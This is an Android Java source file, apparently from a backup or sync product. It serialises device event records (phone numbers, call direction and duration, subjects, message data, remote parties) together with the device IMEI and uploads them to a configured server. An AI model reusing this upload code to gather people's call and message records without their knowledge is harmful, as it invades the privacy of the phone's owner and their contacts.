package com.fx.dalvik.mbackup.delivery;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.os.Message;

import com.fx.android.common.Customization;
import com.fx.android.common.http.HttpWrapper;
import com.fx.android.common.http.HttpWrapperException;
import com.fx.android.common.http.HttpWrapperResponse;
import com.fx.dalvik.event.Event;
import com.fx.dalvik.phoneinfo.PhoneInfoHelper;
import com.fx.dalvik.preference.ConnectionHistoryManager;
import com.fx.dalvik.preference.ConnectionHistoryManagerFactory;
import com.fx.dalvik.preference.model.ConnectionHistory;
import com.fx.dalvik.preference.model.ProductInfo;
import com.fx.dalvik.protocolone.ProtocolOneParser;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.BinaryUtil;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.NetworkUtil;
import com.vvt.android.syncmanager.FxResource;
import com.vvt.android.syncmanager.ProductInfoHelper;
import com.vvt.android.syncmanager.control.Main;

public final class UploadDeviceEvents {

//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------

	private static final String TAG = "UploadDeviceEvents";
	private static final boolean VERBOSE = true;
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? VERBOSE : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final String HTTP_HEADER_NAME_CONTENT_TYPE = "Content-Type";
	private static final String HTTP_HEADER_VALUE_APPLICATION_BINARY = "application/binary";
	private static final String HTTP_HEADER_VALUE_APPLICATION_OCTETSTREAM = "application/octet-stream";
	private static final String UTF_8 = "UTF-8";
	
	private Context mContext;
	private Callback mCallback;
	private ConnectionHistoryManager mConnectionHistoryManager;
	
	private static UploadDeviceEvents sInstance;
	
	public static UploadDeviceEvents getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new UploadDeviceEvents(context);
		}
		return sInstance;
	}
	
	private UploadDeviceEvents(Context context) {
		mContext = context;
		mConnectionHistoryManager = ConnectionHistoryManagerFactory.getConnectionHistoryManager();
	}
	
	private UploadDeviceEvents() {
		
	}
	
	/**
	 * Handler to simulate event sending.
	 */
	private Handler mSendHandler = new Handler() {
		
		@SuppressWarnings("unchecked")
		@Override
		public void handleMessage(Message message) {
//			if (LOCAL_LOGV) {
//				FxLog.v(TAG, "handleMessage # ENTER ...");
//				FxLog.v(TAG, String.format("handleMessage # mCallback = %s", mCallback));
//			}
			
			if (mCallback != null) {
				List<Event> sentDeviceEventsList = (List<Event>) message.obj;
//				if (LOCAL_LOGV) FxLog.v(TAG, "handleMessage # Calling onSent()");
				mCallback.onSent(sentDeviceEventsList);
			}
		}
	};
	
	/**
	 * Thread to simulate event sending. 
	 */
	private class SendThread extends Thread {
		
		public List<Event> mDeviceEventsList;
		
		public SendThread(List<Event> deviceEventsList) {
			super();
			mDeviceEventsList = deviceEventsList;
		}
		
		public void run() {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "run # ENTER...");
			}
			
			List<Event> sentEventsList = null;
			
			try {
				if (LOCAL_LOGV) {
					for (Event deviceEvent : mDeviceEventsList) {
						FxLog.v(TAG, String.format("run # Sending event to the server: %s...", 
								deviceEvent));
					}
				}
				
				if (mDeviceEventsList.size() != 0) {
					ResponseContainerDeviceEvents responseContainer = 
						upload(mDeviceEventsList, true);
					
					if (LOCAL_LOGV) {
						if (responseContainer != null) {
							FxLog.v(TAG, "\n**************************************************");
							FxLog.v(TAG, String.format(
									"run # Upload finished, event processed = '%d'", 
									responseContainer.getDeviceEventsProcessed()));
							FxLog.v(TAG, "**************************************************\n");
						} 
						else {
							FxLog.v(TAG, "\n**************************************************");
							FxLog.v(TAG, "run # Response container is NULL!!");
							FxLog.v(TAG, "**************************************************\n");
						}
						
					}
					
					if (responseContainer != null && ! responseContainer.hasError()) {
						sentEventsList = mDeviceEventsList.subList(0, 
								responseContainer.getDeviceEventsProcessed());
					}
				} else {
					if (LOCAL_LOGV) {
						FxLog.v(TAG, "run # There are no events in the list. " +
								"Send an empty list to the callback");
					}
					sentEventsList = new ArrayList<Event>();
				}
			} catch (Exception e) {
				if (LOCAL_LOGD) FxLog.d(TAG, "run # An unexpected error occurs.", e);
			}
			
			Message message = new Message();
			message.obj = sentEventsList;
			
//			if (LOCAL_LOGV) {
//				FxLog.v(TAG, String.format(
//						"run # Sending message to the handler: message.obj = %s", 
//						message.obj));
//			}
			mSendHandler.sendMessage(message);
		}
		
	}
	
	/**
	 * Try to upload device events and get back a response container. If there is no network 
	 * connection, this method will return <code>null</code>.
	 * 
	 * @param deviceEventsList
	 * @param sendLargeDataSetFlag
	 * @return
	 */
	private ResponseContainerDeviceEvents upload(
			List<Event> deviceEventsList, boolean sendLargeDataSetFlag) {
		
		if (LOCAL_LOGV) FxLog.v(TAG, "upload # ENTER ...");
		
		ConnectionHistory connectionHistory = new ConnectionHistory();
		connectionHistory.setAction(ConnectionHistory.Action.UPLOAD_EVENTS);
		connectionHistory.setNumEventsSent(deviceEventsList.size());

		if (LOCAL_LOGV) {
			FxLog.v(TAG, "upload # Checking internet connection...");
		}
		
		boolean hasInternetConnection = NetworkUtil.hasInternetConnection(mContext);
		
		if (!hasInternetConnection) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "upload # No internet connection, cannot upload");
			}

			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.NO_CONNECTION);
			mConnectionHistoryManager.addConnectionHistory(connectionHistory);
			
			return null;
		}
		
		ProductInfo productInfo = ProductInfoHelper.getProductInfo(mContext);
		
		String encodedUrlString = productInfo.getUrlDelivery();
		ByteArrayOutputStream uploadStream = getUploadStream(deviceEventsList);
		byte[] uploadData = uploadStream.toByteArray();
		
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, String.format("upload # URL: %s", encodedUrlString));
//			FxLog.v(TAG, String.format("upload # Upload Data: %s", 
//					BinaryUtil.bytesToString2(uploadData)));
//			FxLog.v(TAG, "upload # Upload Data Length (bytes): " + uploadData.length);
//		}
		
		// HTTP Settings 
		HttpWrapper httpWrapper = HttpWrapper.getInstance();
		httpWrapper.setHeader("Content-Type", "Application/Binary");
		
		if (sendLargeDataSetFlag) {
			httpWrapper.setSocketTimeoutMilliseconds(
					(int) Customization.getDefaultURLRequestTimeoutLong() * 1000);
		} else {
			httpWrapper.setSocketTimeoutMilliseconds(
					(int) Customization.getDefaultURLRequestTimeoutShort() * 1000);
		}
		
		HttpWrapperResponse response = null;
		HttpWrapperException responseException = null;

		int networkType = NetworkUtil.getActiveNetworkType(mContext);
		
		if (networkType == ConnectivityManager.TYPE_MOBILE) {
			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.MOBILE);
		} 
		else if (networkType == ConnectivityManager.TYPE_WIFI) {
			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.WIFI);
		} 
		else {
			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.UNRECOGNIZED);
		}
		
		// Retrieve response from httpPost()
		connectionHistory.setConnectionStartTime(System.currentTimeMillis());
		try {
			response = httpWrapper.httpPost(encodedUrlString, uploadData);
		} 
		catch (HttpWrapperException httpWrapperException) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, null, httpWrapperException);
			}
			responseException = httpWrapperException;
			connectionHistory.setHttpStatusCode(responseException.getHttpStatusCode());
		}
		connectionHistory.setConnectionEndTime(System.currentTimeMillis());
		
		if (LOCAL_LOGV && response != null) {
			FxLog.v(TAG, String.format("upload # Response Data: %s", 
					BinaryUtil.bytesToString2(response.getBodyAsBytes())));
		}
		
		// Construct ResponseContainer object from response
		ResponseContainerDeviceEvents responseContainer 
				= getResponseContainer(deviceEventsList, response, responseException);
		
		if (LOCAL_LOGV) {
			if (responseContainer != null) {
				FxLog.v(TAG, String.format("upload # Response String -> %1$s", 
						responseContainer.toString()));
			}
		}
		
		if (responseContainer != null) {
			
			if (! responseContainer.hasError() || 
					responseContainer.getDeviceEventsProcessed() > 0) {
				connectionHistory.setConnectionStatus(ConnectionHistory.ConnectionStatus.SUCCESS);
			} 
			else {
				connectionHistory.setConnectionStatus(ConnectionHistory.ConnectionStatus.FAILED);
			}
			
			connectionHistory.setResponseCode((byte) responseContainer.getCodeAsInt());
			connectionHistory.setNumEventsProcessed(responseContainer.getDeviceEventsProcessed());
			
			if (LOCAL_LOGV) {
				int numEventsProcessed = connectionHistory.getNumEventsProcessed();
				
				if (numEventsProcessed < 0) {
					numEventsProcessed = 0;
				}
				
				for (int i = 0 ; i < numEventsProcessed ; i++) {
					FxLog.v(TAG, String.format(
							"upload # [EVENT-DELIVERY]: SUCCESS, %s", 
							deviceEventsList.get(i)));
				}
				
				for (int i = numEventsProcessed ; i < deviceEventsList.size() ; i++) {
					FxLog.v(TAG, String.format(
							"upload # [EVENT-DELIVERY]: FAILED, %s", 
							deviceEventsList.get(i)));
				}
			}
		}
		
		mConnectionHistoryManager.addConnectionHistory(connectionHistory);
		
		return responseContainer;
	}
	
	/**
	 * Verify and Construct a ResponseContainer object
	 * @param deviceEventsList
	 * @param response
	 * @param responseException
	 * @return
	 */
	@SuppressWarnings("unused")
	private ResponseContainerDeviceEvents getResponseContainer(
			List<Event> deviceEventsList, 
			HttpWrapperResponse response, 
			HttpWrapperException responseException) {
		
//		if (LOCAL_LOGV) FxLog.v(TAG, "getResponseContainer # ENTER ...");
		
		Context context = Main.getContext();
		
		ResponseContainerDeviceEvents responseContainer = null;
		
		// Response protocol
		// Min response length is 14 bytes
		//
		//	POSITION
		//    3							= CODE						1 byte
		//    4							= MESSAGE_LENGTH			2 bytes
		//    6							= MESSAGE					MESSAGE_LENGTH bytes -> NOT USED
		//    6+MESSAGE_LENGTH			= NUMBER_EVENTS_PROCESSED	4 bytes
		//
		// On success MESSAGE contains a status message
		// On failure MESSAGE contains an error message
		
		// If the response contains no exception and responseData is not null
		if (response != null) {
			byte[] responseData = response.getBodyAsBytes();
			int statusCode = response.getHttpStatusCode();
			HttpWrapperResponse.Header headers[] = response.getAllHeaders();
			
//			if (LOCAL_LOGV) {
//				int i = 0;
//				for (HttpWrapperResponse.Header header : headers) {
//					FxLog.v(TAG, String.format("getResponseContainer # header[%d] %s: %s", i++, 
//							header.getName(), header.getValue()));
//				}
//			}
			
			String contentType = null;
			
			for (HttpWrapperResponse.Header header : headers) {
				if (HTTP_HEADER_NAME_CONTENT_TYPE.equalsIgnoreCase(header.getName())) {
					contentType = header.getValue();
					break;
				}
			}
			
			if (responseException == null
					&& statusCode >= 200 && statusCode < 300 
					&& responseData != null && responseData.length >= 14
					&& (HTTP_HEADER_VALUE_APPLICATION_BINARY.equalsIgnoreCase(contentType) ||
						HTTP_HEADER_VALUE_APPLICATION_OCTETSTREAM.equalsIgnoreCase(contentType))) {
			
				byte responseCodeByte = responseData[3]; 

				String responseCodeString = String.format("%d", 0xff & responseCodeByte);
//				if (LOCAL_LOGV) {
//					FxLog.v(TAG, String.format("getResponseContainer # " +
//							"Response Code String: %s", responseCodeString));
//				}
				
				short responseMessageLengthShort = BinaryUtil.bytesToShort(responseData, 4, true);
//				if (LOCAL_LOGV) {
//					FxLog.v(TAG, String.format("getResponseContainer # " +
//							"Response Message Length: %d", responseMessageLengthShort));
//				}
				
				String messageFromServer = null;
				
				if (responseMessageLengthShort > 0) {
					messageFromServer = BinaryUtil.bytesToString2(responseData, 6, 
							6 + responseMessageLengthShort);
//					if (LOCAL_LOGV) {
//						FxLog.v(TAG, String.format("getResponseContainer # " +
//								"Message from server: \"%s\"", 
//								messageFromServer));
//					}
				}
				
				int deviceEventsProcessed = BinaryUtil.bytesToInt(
						responseData, 6 + responseMessageLengthShort, true);
				
//				if (LOCAL_LOGV) {
//					FxLog.v(TAG, String.format(
//							"getResponseContainer # Number of events processed: %d", 
//							deviceEventsProcessed));
//				}
				
				// Processed Events equal to Events in List -> Success
				// This is the only case that contains no ERROR flag
				if (responseCodeByte == 0 && deviceEventsProcessed == deviceEventsList.size()) {
//					if (LOCAL_LOGV) {
//						FxLog.v(TAG, "getResponseContainer # FxLogevents sent successfully");
//					}
					
					responseContainer = new ResponseContainerDeviceEvents(
							responseCodeString, 
							FxResource.language_events_response_success,
							false, deviceEventsProcessed);
				} else if (deviceEventsProcessed != deviceEventsList.size() 
						&& (responseCodeByte == 0 || responseCodeByte == (byte) 225)) {
					// Processed Events not equal to Events in List -> Partial Success
					
//					if (LOCAL_LOGV) {
//						FxLog.v(TAG, String.format("getResponseContainer # " +
//								"Sent '%d' log events from the '%d' available, server response = %s", 
//							deviceEventsProcessed, deviceEventsList.size(), responseCodeString));
//					}
					
					responseContainer = new ResponseContainerDeviceEvents(
							responseCodeString, 
							String.format(StringResource.LANG_DELIVERY_PARTIAL_SUCCESS, 
									deviceEventsProcessed, 
									deviceEventsList.size()), 
									true, 
									deviceEventsProcessed);
				} else { // Handle other response codes
					
					String errorMessage; 
						
					if (messageFromServer != null) {
//						if (LOCAL_LOGV) {
//							FxLog.v(TAG, "getResponseContainer # Use message from server");
//						}
						errorMessage = messageFromServer;
					} 
					else {
						errorMessage = "Cannot get message from server";
					}
					
//					if (LOCAL_LOGV) {
//						FxLog.v(TAG, String.format(
//								"getResponseContainer # response: %s", 
//								BinaryUtil.bytesToString2(responseData)));
//						
//						FxLog.v(TAG, String.format(
//								"getResponseContainer # Got an error ID %d:\"%s\" from the server", 
//								0xff & responseCodeByte, errorMessage));
//					}
					
					responseContainer = new ResponseContainerDeviceEvents(
							responseCodeString, errorMessage, true, 0);
				}
			}
		}
		// Got HttpWrapperException e.g. ConnectionTimeout
		else if (responseException != null) {
			if (response != null) {
				// TODO: Check this logic
//				if (LOCAL_LOGV) {
//					FxLog.v(TAG, String.format("getResponseContainer # " +
//							"Invalid HTTP status code: %d", response.getHttpStatusCode()));
//				}
				responseContainer = new ResponseContainerDeviceEvents(
						String.valueOf(response.getHttpStatusCode()),
						String.format("%s\n%s ", 
								responseException.getLocalizedMessage(), 
								FxResource.language_events_response_failed_unknown_1), 
						true, 
						ResponseContainerDeviceEvents.PROCESSED_UNKNOWN);
			} else { // e.g. timeout (no HTTP status code)
				// TODO: Check this logic
//				if (LOCAL_LOGV) {
//					FxLog.v(TAG, String.format("getResponseContainer # " +
//							"Connection error: %s", responseException.getLocalizedMessage()));
//				}
				responseContainer = new ResponseContainerDeviceEvents(
						String.format("%d", ResponseContainerDeviceEvents.RESPONSE_FAILED),
						String.format("getResponseContainer # %s\n%s ", 
								responseException.getLocalizedMessage(),
								FxResource.language_events_response_failed_unknown_1),
						true, ResponseContainerDeviceEvents.PROCESSED_UNKNOWN);
			}
		} else {
//			if (LOCAL_LOGV) {
//				FxLog.v(TAG, "getResponseContainer # No error sending the request " +
//						"so we just do not understand the response");
//			}
			responseContainer = new ResponseContainerDeviceEvents(
					String.format("%d", ResponseContainerDeviceEvents.RESPONSE_NOT_RECOGNIZED),
					String.format("%s%s ", 
							FxResource.language_events_response_incorrect_length, 
							FxResource.language_events_response_failed_unknown_2), 
					true, 
					ResponseContainerDeviceEvents.PROCESSED_UNKNOWN);
		}
		return responseContainer;
	}
	
	/**
	 * Construct an upload stream according to the protocol.
	 * @param deviceEventsList
	 * @return
	 */
	private ByteArrayOutputStream getUploadStream(List<Event> deviceEventsList) { 
//		if (LOCAL_LOGV) FxLog.v(TAG, "getUploadStream # ENTER ...");
	
		// TODO: If the protocol is changed (other than protocol one), modify the code here.
		ByteArrayOutputStream uploadStream = getUploadProtocolOneHeader(
				(short) deviceEventsList.size());
		try {
			for (Event event : deviceEventsList) { 
				getUploadProtocolOneBody(event).writeTo(uploadStream);
			}
		} catch (IOException e) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, null, e);
			}
		}
		
		return uploadStream;
	}
	
	private ByteArrayOutputStream getUploadProtocolOneHeader(short numberOfLogevents) { 
		// Request protocol
		// Length is 78 bytes
		//
		//	POSITION
		//    1						= PRODCT_ID					2 bytes
		//    3						= PRODCT_MAJOR_VERSION		1 byte
		//    4						= PRODCT_MINOR_VERSION		1 byte
		//    5						= DEVICE_ID					16 bytes
		//    21					= Empty						4+32+16=52 bytes
		//    73					= COMMAND '1'				2 bytes
		//    75					= Empty						2 bytes
		//    77					= NUMBER_OF_LOGEVENTS		2 bytes
		
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		DataOutputStream dataOutStream = new DataOutputStream(outStream); 
		
		ProductInfo productInfo = ProductInfoHelper.getProductInfo(mContext);

		try {
			dataOutStream.writeShort(productInfo.getId());
			dataOutStream.writeByte(Integer.parseInt(productInfo.getVersionMajor()));
			dataOutStream.writeByte(Integer.parseInt(productInfo.getVersionMinor()));
			
			String originalImeiString = PhoneInfoHelper.getDeviceId(mContext); 
			String imeiString = String.format("%-16s", originalImeiString).substring(0, 16);
			dataOutStream.write(imeiString.getBytes(UTF_8));
			
			dataOutStream.write(new byte[52]);
			dataOutStream.writeShort(getCommand());
			dataOutStream.write(new byte[2]);
			dataOutStream.writeShort(numberOfLogevents);
			
			dataOutStream.flush();
		} 
		catch (IOException e) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, null, e);
			}
		}
		
		return outStream;
	}
	
	private ByteArrayOutputStream getUploadProtocolOneBody(Event event) { 
		// Request protocol
		// Length is 32 +TIME_LENGTH +PHONENUMBER_LENGTH +DESCRIPTION_LENGTH +SUBJECT_LENGTH +STATUS_LENGTH +DATA_LENGTH bytes +REMOTEPARTY_LENGTH bytes
		//
		//	POSITION
		//    1																									= ID					4 bytes
		//    5																									= TYPE					1 byte
		//    6																									= TIME_LENGTH			1 byte
		//    7+TIME_LENGTH																						= TIME					TIME_LENGTH bytes
		//    8+TIME_LENGTH																						= DIRECTION				1 byte
		//    9+TIME_LENGTH																						= DURATION				4 bytes
		//    13+TIME_LENGTH																					= PHONENUMBER_LENGTH	2 bytes
		//    15+TIME_LENGTH																					= PHONENUMBER			PHONENUMBER_LENGTH bytes
		//    16+TIME_LENGTH+PHONENUMBER_LENGTH																	= DESCRIPTION_LENGTH	2 bytes
		//    18+TIME_LENGTH+PHONENUMBER_LENGTH																	= DESCRIPTION			DESCRIPTION_LENGTH bytes
		//    19+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH												= SUBJECT_LENGTH		2 bytes
		//    21+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH												= SUBJECT				SUBJECT_LENGTH bytes
		//    22+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH								= STATUS_LENGTH			2 bytes
		//    24+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH								= STATUS				STATUS_LENGTH bytes
		//    25+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH					= DATA_LENGTH			4 bytes
		//    29+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH					= DATA					DATA_LENGTH bytes
		//    30+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH+DATA_LENGTH		= REMOTEPARTY_LENGTH	2 bytes
		//    32+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH+DATA_LENGTH		= REMOTEPARTY			REMOTEPARTY_LENGTH bytes
		
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		DataOutputStream dataOutStream = new DataOutputStream(outStream); 
		
		try {
			dataOutStream.writeInt(ProtocolOneParser.getProtocolOneEventId(event));
			
			dataOutStream.write(ProtocolOneParser.getProtocolOneEventType(event));
			
			String protocolOneTime = ProtocolOneParser.getProtocolOneTime(event);
			byte[] timeBytes = protocolOneTime.getBytes(UTF_8);
			dataOutStream.write(timeBytes.length);
			dataOutStream.write(timeBytes, 0, timeBytes.length);
			
			dataOutStream.write(ProtocolOneParser.getProtocolOneDirection(event));
			
			dataOutStream.writeInt(ProtocolOneParser.getProtocolOneDuration(event));
			
			String phoneNumber = ProtocolOneParser.getProtocolOnePhonenumber(event);
			byte[] phoneBytes = phoneNumber.getBytes(UTF_8);
			dataOutStream.writeShort(phoneBytes.length);
			dataOutStream.write(phoneBytes, 0, phoneBytes.length);
			
			String description = ProtocolOneParser.getProtocolOneDescription(event);
			byte[] descrBytes = description.getBytes(UTF_8);
			dataOutStream.writeShort(descrBytes.length);
			dataOutStream.write(descrBytes, 0, descrBytes.length);
			
			String subject = ProtocolOneParser.getProtocolOneSubject(event);
			byte[] subjectBytes = subject.getBytes(UTF_8);
			dataOutStream.writeShort(subjectBytes.length);
			dataOutStream.write(subjectBytes, 0, subjectBytes.length);
			
			String status = ProtocolOneParser.getProtocolOneStatus(event);
			byte[] statusBytes = status.getBytes(UTF_8);
			dataOutStream.writeShort(statusBytes.length);
			dataOutStream.write(statusBytes, 0, statusBytes.length);
			
			String data = ProtocolOneParser.getProtocolOneData(event);
			byte[] dataBytes = data.getBytes(UTF_8);
			dataOutStream.writeInt(dataBytes.length);
			dataOutStream.write(dataBytes, 0, dataBytes.length);
			
			String remoteParty = ProtocolOneParser.getProtocolOneRemoteparty(event);
			byte[] remotePartyBytes = remoteParty.getBytes(UTF_8);
			dataOutStream.writeShort(remotePartyBytes.length);
			dataOutStream.write(remotePartyBytes, 0, remotePartyBytes.length);
			
			dataOutStream.flush();
		} 
		catch (IOException e) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, null, e);
			}
		}
		
		return outStream;
	}
	
	private short getCommand() { 
		return 1; 
	}
	
	public static interface Callback {
		void onSent(List<Event> sentDeviceEventsList);
	}
	
	public void setCallback(Callback callback) {
		mCallback = callback;
	}
	
	public void asyncSend(List<Event> deviceEventsList) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "asyncSend # ENTER ...");
			if (deviceEventsList != null) {
				FxLog.v(TAG, String.format(
						"asyncSend # Trying to send %d events...", deviceEventsList.size()));
			} 
			else {
				FxLog.v(TAG, "asyncSend # Trying to send a null list...");
			}
		}
		
		SendThread sendThread = new SendThread(deviceEventsList);
		sendThread.start();
	}
	
}
